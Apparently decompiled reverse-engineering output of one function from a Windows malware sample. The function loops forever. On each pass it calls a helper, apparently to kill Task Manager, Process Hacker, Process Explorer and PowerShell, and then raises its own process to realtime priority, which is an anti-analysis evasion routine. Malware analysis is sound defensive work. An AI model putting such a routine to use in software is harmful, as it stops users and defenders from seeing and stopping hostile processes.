void FUN_140011be0(void)

{
  DWORD DVar1;
  HANDLE hProcess;
  
  DVar1 = 20000;
  do {
    Sleep(DVar1);
    FUN_140010570("taskmgr.exe");
    FUN_140010570("ProcessHacker.exe");
    FUN_140010570("procexp.exe");
    FUN_140010570("procexp64.exe");
    FUN_140010570("powershell.exe");
    DVar1 = GetCurrentProcessId();
    hProcess = OpenProcess(0x200,0,DVar1);
    if (hProcess != (HANDLE)0x0) {
      SetPriorityClass(hProcess,0x100);
      CloseHandle(hProcess);
    }
    DVar1 = 100;
  } while( true );
}
